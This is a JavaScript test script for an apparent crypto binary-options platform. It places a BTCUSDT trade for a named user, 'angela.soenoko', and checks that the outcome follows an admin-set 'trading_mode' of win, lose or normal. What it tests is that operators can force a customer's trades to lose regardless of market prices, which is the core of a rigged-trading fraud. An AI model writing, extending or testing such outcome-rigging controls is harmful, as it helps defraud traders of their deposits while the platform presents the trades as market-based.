const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

async function testTradingControls() {
  console.log('🧪 TESTING TRADING CONTROLS...');

  try {
    // 1. First, verify the user's trading mode
    console.log('\n1️⃣ Checking user trading mode...');
    const usersResponse = await fetch('http://localhost:3005/api/admin/users');
    const users = await usersResponse.json();

    const testUser = users.find(u => u.username === 'angela.soenoko');
    if (!testUser) {
      console.error('❌ Test user not found!');
      return;
    }

    console.log(`✅ User found: ${testUser.username}`);
    console.log(`🎯 Current trading mode: ${testUser.trading_mode}`);
    console.log(`💰 Current balance: ${testUser.balance}`);

    // 2. Place a test trade
    console.log('\n2️⃣ Placing test trade...');
    const tradeData = {
      userId: testUser.id,
      symbol: 'BTCUSDT',
      direction: 'up',
      amount: 100,
      duration: 30,
      entryPrice: 65000
    };

    const tradeResponse = await fetch('http://localhost:3005/api/trades/options', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(tradeData)
    });

    const tradeResult = await tradeResponse.json();
    console.log('📈 Trade placed:', tradeResult);

    if (!tradeResult.success) {
      console.error('❌ Failed to place trade:', tradeResult.message);
      return;
    }

    const tradeId = tradeResult.trade.id;
    console.log(`🆔 Trade ID: ${tradeId}`);

    // 3. Wait for trade completion (35 seconds)
    console.log('\n3️⃣ Waiting for trade completion (35 seconds)...');
    await new Promise(resolve => setTimeout(resolve, 35000));

    // 4. Check the trade result
    console.log('\n4️⃣ Checking trade result...');
    const updatedUsersResponse = await fetch('http://localhost:3005/api/admin/users');
    const updatedUsers = await updatedUsersResponse.json();

    const updatedUser = updatedUsers.find(u => u.username === 'angela.soenoko');
    console.log(`💰 Updated balance: ${updatedUser.balance}`);

    // 5. Get trade history to verify outcome
    const tradesResponse = await fetch(`http://localhost:3005/api/users/${testUser.id}/trades`);
    const trades = await tradesResponse.json();

    const completedTrade = trades.find(t => t.id === tradeId);
    if (completedTrade) {
      console.log(`🏁 Trade result: ${completedTrade.result}`);
      console.log(`💵 Profit/Loss: ${completedTrade.profit}`);

      // 6. Verify trading control enforcement
      console.log('\n5️⃣ Verifying trading control enforcement...');
      const expectedOutcome = testUser.trading_mode === 'lose' ? 'lose' :
                             testUser.trading_mode === 'win' ? 'win' :
                             'normal';

      if (testUser.trading_mode === 'lose' && completedTrade.result === 'lose') {
        console.log('✅ TRADING CONTROLS WORKING! User set to LOSE mode and trade resulted in LOSE');
      } else if (testUser.trading_mode === 'win' && completedTrade.result === 'win') {
        console.log('✅ TRADING CONTROLS WORKING! User set to WIN mode and trade resulted in WIN');
      } else if (testUser.trading_mode === 'normal') {
        console.log('✅ TRADING CONTROLS WORKING! User in NORMAL mode, outcome based on market');
      } else {
        console.log('❌ TRADING CONTROLS NOT WORKING!');
        console.log(`   Expected: ${expectedOutcome} (based on trading_mode: ${testUser.trading_mode})`);
        console.log(`   Actual: ${completedTrade.result}`);
      }
    } else {
      console.log('❌ Trade not found in history');
    }

  } catch (error) {
    console.error('❌ Test failed:', error);
  }
}

// Run the test
testTradingControls();
